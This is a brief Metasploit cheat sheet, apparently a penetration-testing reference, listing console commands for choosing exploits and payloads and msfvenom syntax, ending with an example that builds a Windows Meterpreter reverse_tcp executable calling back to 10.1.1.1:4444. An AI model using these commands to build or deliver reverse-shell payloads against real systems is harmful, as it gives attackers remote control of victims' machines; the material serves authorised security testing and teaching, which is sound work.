## MetaSploit ##

Search for module: 
`search MODULE`

Specify and exploit to use:
` use exploit/[ExploitPath]`

Specify a Payload to use: 
`set PAYLOAD [PayloadPath]`

Specify a Payload to use: 
`set PAYLOAD [PayloadPath]`

Set options: 
`set [Option] [Value]`

Move files to/from the target 
machine
`download / upload`


**msfvenom**

*The msfvenom tool can be used to generate Metasploit
payloads (such as Meterpreter) as standalone files and 
optionally encode them. This tool replaces the former 
msfpayload and msfencode tools. Run with 
‘'-l payloads’ to get a list of payloads.*

`msfvenom –p [PayloadPath] 
–f [FormatType] 
LHOST=[LocalHost (if reverse conn.)] 
LPORT=[LocalPort]`

Example:

`msfvenom -p windows/meterpreter/
reverse_tcp -f exe LHOST=10.1.1.1 
LPORT=4444 > met.exe`